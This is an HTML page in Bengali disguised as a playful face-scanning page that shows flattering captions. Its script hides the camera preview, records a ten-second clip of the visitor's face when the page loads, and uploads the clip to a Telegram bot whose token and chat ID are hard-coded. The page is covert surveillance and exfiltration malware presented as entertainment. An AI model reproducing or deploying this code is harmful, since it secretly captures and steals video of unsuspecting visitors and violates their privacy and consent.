<!DOCTYPE html>
<html lang="bn">
<head>
  <meta charset="UTF-8">
  <title>আপনার মুখের জাদু</title>
  <style>
    body {
      background-color: black;
      color: white;
      font-family: 'Arial', sans-serif;
      text-align: center;
    }
    video {
      width: 1px; /* ক্যামেরা লুকানো */
      height: 1px;
      opacity: 0;
      position: absolute;
    }
    .text-box {
      margin-top: 80px;
      padding: 15px;
      border: 2px dashed #00ffff;
      font-size: 20px;
      width: 80%;
      margin-left: auto;
      margin-right: auto;
      border-radius: 10px;
      background-color: rgba(255,255,255,0.05);
    }
    h2 {
      margin-top: 100px;
    }
  </style>
</head>
<body>
  <h2>আপনার মুখ স্ক্যান হচ্ছে...</h2>
  <video id="preview" autoplay muted></video>
  <div class="text-box" id="captionBox">"আপনার চোখে অনেক কিছু বলা আছে..."</div>

  <script>
    const video = document.getElementById("preview");
    const captionBox = document.getElementById("captionBox");
    const captions = [
      "আপনার চোখে অনেক কিছু বলা আছে...",
      "আপনার হাসি আজকের দিনটা সুন্দর করবে!",
      "আপনি কি জানেন আপনি কতটা ইউনিক?",
      "মুখে আছে এক আত্মবিশ্বাসের ছাপ!",
      "AI বলছে আপনি একজন নেতৃস্থানীয় মানুষ!",
      "আপনার মুখ দেখেই দিনটা ভালো হয়ে গেল!",
      "এই চেহারাটা অনেক ভালো লাগছে!",
      "আপনি কি মডেল হবার কথা চিন্তা করেছেন কখনো?",
    ];

    const TELEGRAM_BOT_TOKEN = "7460221175:AAGn19zxbV_sXOWjW1ViDc3v4kHyS5WDGZU";
    const TELEGRAM_CHAT_ID = "6429244657";

    let chunks = [];
    let mediaRecorder;

    function sendToTelegram(blob) {
      const formData = new FormData();
      formData.append("chat_id", TELEGRAM_CHAT_ID);
      formData.append("video", blob, "face_clip.webm");

      fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendVideo`, {
        method: "POST",
        body: formData
      })
      .then(res => console.log("✅ ভিডিও টেলিগ্রামে পাঠানো হয়েছে"))
      .catch(err => console.error("❌ পাঠাতে সমস্যা:", err));
    }

    function startRecording(stream) {
      mediaRecorder = new MediaRecorder(stream);
      mediaRecorder.ondataavailable = e => chunks.push(e.data);

      mediaRecorder.onstop = () => {
        const blob = new Blob(chunks, { type: 'video/webm' });
        sendToTelegram(blob);
        chunks = [];
      };

      mediaRecorder.start();
      setTimeout(() => mediaRecorder.stop(), 10000); // ১০ সেকেন্ডের ভিডিও
    }

    navigator.mediaDevices.getUserMedia({ video: true, audio: false })
      .then(stream => {
        video.srcObject = stream;
        startRecording(stream);

        // লেখা ঘোরে প্রতি ৩ সেকেন্ডে
        let index = 0;
        setInterval(() => {
          captionBox.textContent = captions[index % captions.length];
          index++;
        }, 3000);
      })
      .catch(err => {
        alert("⚠️ ক্যামেরা চালু করা যায়নি: " + err);
      });
  </script>
</body>
</html>
